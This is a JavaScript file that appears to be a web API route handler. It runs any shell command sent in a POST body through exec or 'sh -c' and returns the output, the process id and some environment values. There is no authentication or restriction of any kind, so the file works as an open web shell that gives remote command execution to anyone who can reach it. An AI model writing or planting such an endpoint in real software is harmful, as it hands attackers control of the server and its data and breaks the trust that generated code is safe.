import { exec, spawn } from 'child_process';
import { promisify } from 'util';

const execAsync = promisify(exec);

export default async function handler(req, res) {
  if (req.method !== 'POST')
    return res.status(405).json({ error: 'Method not allowed' });

  const { command, type = 'exec' } = req.body;

  if (!command)
    return res.status(400).json({ error: 'Command required' });


  try {
    let result;

    if (type === 'exec') {
      const { stdout, stderr } = await execAsync(command, {
        timeout: 10000,
        maxBuffer: 1024 * 1024
      });
      result = { stdout, stderr };
    } else if (type === 'spawn') {
      result = await new Promise((resolve, reject) => {
        const child = spawn('sh', ['-c', command], {
          stdio: ['pipe', 'pipe', 'pipe']
        });

        let stdout = '';
        let stderr = '';

        child.stdout.on('data', (data) => {
          stdout += data.toString();
        });

        child.stderr.on('data', (data) => {
          stderr += data.toString();
        });

        child.on('close', (code) => {
          resolve({ stdout, stderr, exitCode: code });
        });

        child.on('error', reject);

        setTimeout(() => {
          child.kill();
          reject(new Error('Command timeout'));
        }, 10000);
      });
    }

    res.status(200).json({
      success: true,
      command,
      result,
      timestamp: new Date().toISOString(),
      pid: process.pid,
      env: {
        NODE_ENV: process.env.NODE_ENV,
        PWD: process.env.PWD,
        USER: process.env.USER,
        HOME: process.env.HOME
      }
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      command,
      error: error.message,
      timestamp: new Date().toISOString()
    });
  }
}